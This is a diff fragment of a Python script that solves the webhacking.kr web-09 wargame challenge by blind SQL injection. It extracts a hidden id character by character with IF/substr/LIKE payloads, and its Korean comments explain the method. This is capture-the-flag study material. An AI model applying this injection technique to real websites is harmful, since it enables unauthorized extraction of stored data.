@@ -89,11 +89,11 @@ f.close()
 
 url="https://webhacking.kr/challenge/web-09/index.php?no=IF(substr(id,"
 passwd=""
-for i in range(1,12): #원래는 1 부터 길이+1 까지
+for i in range(1,12): #IF(LENGTH(id)LIKE(길이),3,5) 로 길이를 먼저 알아낸 후 길이만큼 루프
     for j in range(33, 127): #hex변환할 글자 33 = !, 126 = ~(전까지) format(j,'x')
         if(chr(j)=="%"):
             continue
-        payload=session.get(url+str(i)+",1)LIKE("+hex(j)+"),3,5)",cookies=cookie)
+        payload=session.get(url+str(i)+",1)LIKE("+hex(j)+"),3,5)",cookies=cookie) #substr로 한글자씩 검사.
         print(url+str(i)+",1)LIKE("+format(j,'x')+"),3,5)")
         if ("Secret" in payload.text):
             print(chr(j) + " is correct!!!!!!!")
